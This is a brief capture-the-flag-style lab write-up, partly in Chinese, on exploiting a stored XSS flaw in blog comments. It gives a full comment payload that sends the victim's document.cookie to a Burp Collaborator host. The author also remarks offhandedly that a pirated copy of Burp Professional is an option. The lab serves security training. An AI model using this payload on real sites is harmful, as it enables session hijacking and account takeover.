# Lab: Exploiting cross-site scripting to steal cookies

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

## XSS
* 題目說要偷 cookie，題目指定要用 burp professional 開 Collaborator client，如果沒有 ... 我也不知道怎麼辦，那個東西就有點像是一個 server 可以知道經過的 data，問題就是 professional 要錢不然的話就要用盜版的，自己衡量衡量 Q
* comment 有問題
```
csrf=SO80tRpsxGvjTor0gs1Xe7nSb4Gb8brT&postId=7&comment=</p><script>new+Image().src="http://z11coh288w6az8e4yb2i19uy1p7fv4.burpcollaborator.net/?q="+%2B+document.cookie</script>&name=123&email=123%40123.com&website=http%3A%2F%2Ffake.com
```
* 發送之後記得按 poll now，之後就偷到 cookie 了